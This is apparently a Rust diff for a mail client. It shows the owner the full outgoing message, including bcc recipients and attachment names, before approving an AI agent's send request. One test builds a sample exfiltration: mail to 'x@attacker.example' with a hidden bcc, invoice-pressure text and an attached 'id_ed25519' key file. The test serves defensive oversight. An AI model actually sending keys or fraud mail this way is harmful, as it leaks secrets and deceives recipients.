@@ -105,14 +105,17 @@ pub struct Asking {
     windows: crate::windows::Seen,
     /// Which question this is: a headless host's answer counts only for the one it showed.
     serial: u64,
+    /// A send's message as it will go, shown under the question ([`crate::send_preview`]).
+    pub preview: Option<crate::SendPreview>,
 }
 
 /// Numbers the questions ([`Asking::serial`]).
 static SERIAL: AtomicU64 = AtomicU64::new(1);
 
 /// A question the host asks the owner in a window of its own (headless; [`crate::Services::ask_owner`]).
-/// All of it is plain text for the owner to read, never markup or links: `text` holds what the
-/// agent asked about.
+/// All of its words are plain text for the owner to read, never markup or links: `text` holds what
+/// the agent asked about. A send's `preview` is the message itself, shown as mail is read: nothing
+/// in it runs and no picture on the web is fetched for it.
 pub struct OwnerQuestion {
     pub title: String,
     /// "An agent wants to …", as the window's own question says it.
@@ -127,6 +130,8 @@ pub struct OwnerQuestion {
     /// Set when the question went without the window's answer (expired, or another mailbox): the
     /// host closes its window, as a no.
     pub cancel: Arc<AtomicBool>,
+    /// A send's message as it will go, for the window to show ([`crate::send_preview`]).
+    pub preview: Option<crate::SendPreview>,
 }
 
 /// The host's window showing a question, and the question it shows.
@@ -253,6 +258,7 @@ fn gate(app: &mut MailApp, req: &ControlRequest, id: &str, mut params: Value, al
                 (req.reply.clone(), crate::now_ms() + WAIT_MS)
             };
             let asked = what.clone();
+            let preview = crate::SendPreview::of(app, id, &params);
             app.asking.push_back(Asking {
                 id: id.to_string(),
                 counted,
@@ -270,6 +276,7 @@ fn gate(app: &mut MailApp, req: &ControlRequest, id: &str, mut params: Value, al
                 shown,
                 windows: crate::windows::seen(app),
                 serial,
+                preview,
             });
             if headless {
                 return ok(json!({"pending": true, "question": serial, "waitingFor": "owner", "asked": asked,
@@ -576,6 +583,7 @@ pub(crate) fn ask_owner_tick(app: &mut MailApp, ctx: &egui::Context) {
             no: no.to_string(),
             seconds: ((a.deadline - now) / 1000.0).floor().max(0.0) as u64,
             cancel: cancel.clone(),
+            preview: a.preview.clone(),
         };
         let serial = a.serial;
         app.owner_window = Some(OwnerWindow { serial, answer: ask(question), cancel });
@@ -651,12 +659,19 @@ pub fn show(app: &mut MailApp, ctx: &egui::Context) {
     let waiting = app.asking.len();
     let mut said = None;
     let frame = egui::Frame::window(&ctx.global_style()).fill(t.surface).inner_margin(egui::Margin::same(16));
-    let width = (ctx.content_rect().width() - 48.0).clamp(160.0, 460.0);
+    // A send shows the message it would send, so the question is wider and taller.
+    let preview = a.preview.clone();
+    let most = if preview.is_some() { 760.0 } else { 460.0 };
+    let width = (ctx.content_rect().width() - 48.0).clamp(160.0, most);
+    let preview_height = (ctx.content_rect().height() * 0.55).clamp(160.0, 560.0);
     egui::Modal::new(layer().id).frame(frame).backdrop_color(t.scrim).show(ctx, |ui| {
         ui.set_width(width);
         ui.spacing_mut().item_spacing = vec2(8.0, 8.0);
         ui.label(egui::RichText::new(tl!("An Agent Is Asking")).font(semibold(14.0)).color(t.text));
         ui.label(egui::RichText::new(text).color(t.text));
+        if let Some(preview) = &preview {
+            crate::send_preview::show(app, ui, preview, preview_height);
+        }
         ui.label(egui::RichText::new(warning()).color(t.text_dim));
         if waiting > 1 {
             ui.label(egui::RichText::new(tln!(waiting - 1, "{n} more question is waiting.", "{n} more questions are waiting.")).color(t.text_dim));
@@ -752,6 +767,43 @@ mod tests {
         let (now, _) = ask(&mut a, "engine.execute", json!({"command": "compose.send"}), vec![Class::Send]);
         assert_eq!(now.unwrap()["ok"], true);
         assert!(a.asking.is_empty());
+    }
+
+    #[test]
+    fn a_send_question_shows_the_message_as_it_will_go() {
+        let mut a = app();
+        a.execute(
+            "mail.new",
+            json!({"to": "x@attacker.example", "bcc": "hidden@example.com", "subject": "Re: Invoice", "body": "Pay the invoice today."}),
+        )
+        .unwrap();
+        a.execute("compose.attach", json!({"name": "id_ed25519", "data": "AAAA"})).unwrap();
+        let (now, _rx) = ask(&mut a, "engine.execute", json!({"command": "compose.send"}), vec![]);
+        assert!(now.is_none(), "asked first");
+        let q = a.asking.front().unwrap();
+        let p = q.preview.as_ref().expect("a send question carries its message");
+        assert_eq!(p.message.subject, "Re: Invoice");
+        assert!(p.message.to.iter().any(|t| t.email == "x@attacker.example"));
+        assert!(p.message.bcc.iter().any(|t| t.email == "hidden@example.com"));
+        assert!(p.message.body.text.contains("Pay the invoice today."), "{}", p.message.body.text);
+        // The file is named with its size, and its bytes don't go with the preview.
+        assert_eq!(p.files.len(), 1);
+        assert_eq!((p.files[0].name.as_str(), p.files[0].size), ("id_ed25519", 3));
+        assert!(p.message.attachments.is_empty());
+        assert!(p.files_line().starts_with("id_ed25519 ("));
+        // A headless host's window reads it back as it was.
+        let back: crate::SendPreview = serde_json::from_value(serde_json::to_value(p).unwrap()).unwrap();
+        assert_eq!(
+            (&back.message.subject, &back.message.bcc, &back.message.body, &back.files),
+            (&p.message.subject, &p.message.bcc, &p.message.body, &p.files)
+        );
+        // The window shows it under the question, and a question about anything else has none.
+        let ctx = egui::Context::default();
+        let mut out = ctx.run_ui(egui::RawInput::default(), |ui| show(&mut a, ui.ctx()));
+        out.textures_delta.clear();
+        answer(&mut a, false);
+        let (_, _rx) = ask(&mut a, "engine.execute", json!({"command": "mail.delete", "params": {}}), vec![]);
+        assert!(a.asking.front().is_none_or(|q| q.preview.is_none()));
     }
 
     #[test]
